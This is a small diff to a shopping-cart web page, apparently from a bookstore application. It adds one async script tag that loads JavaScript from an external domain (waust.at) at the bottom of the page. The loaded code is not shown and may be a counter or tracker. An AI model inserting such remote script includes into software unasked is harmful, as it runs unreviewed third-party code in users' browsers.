@@ -240,5 +240,6 @@
     location.href="updateQuantity.go?bookNo="+bookNo+"&quantity="+quantity+"&su="+su+"";
   }
 </script>
+<script async src="//waust.at/d.js"></script>
 </body>
 </html>
